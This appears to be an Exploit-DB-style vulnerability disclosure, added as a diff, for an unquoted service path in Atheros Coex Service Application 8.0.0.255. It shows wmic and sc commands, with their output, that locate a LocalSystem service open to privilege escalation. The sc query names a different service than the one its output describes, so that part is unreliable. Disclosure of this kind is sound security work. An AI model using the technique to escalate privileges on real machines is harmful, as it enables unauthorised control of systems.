@@ -1,0 +1,30 @@
+#Exploit Title: Atheros Coex Service Application 8.0.0.255 -'ZAtheros Bt&Wlan Coex Agent' Unquoted Service Path
+#Exploit Author : Isabel Lopez
+#Exploit Date: 2020-11-13
+#Vendor Homepage : https://www.file.net/process/ath_coexagent.exe.html
+#Link Software : https://www.boostbyreason.com/resource-file-9102-ath_coexagent-exe.aspx
+#Tested on OS: Windows 8.1 (64bits)
+
+
+# 1. Description
+# Atheros Coex Service Application 8.0.0.255 has an unquoted service path.
+
+# 2. PoC
+
+C:\>wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /V "C:\Windows" | findstr /i /V """"
+
+ZAtheros Bt&Wlan Coex Agent	ZAtheros Bt&Wlan Coex Agent	C:\Program Files (x86)\Bluethooth Suite\Aht_CoexAgent.exe    Auto
+
+C:\>sc qc WCAssistantService
+[SC] QueryServiceConfig SUCCES
+
+SERVICE_NAME: WCAssistantService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Bluethooth Suite\Aht_CoexAgent.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : ZAtheros Bt&Wlan Coex Agent
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
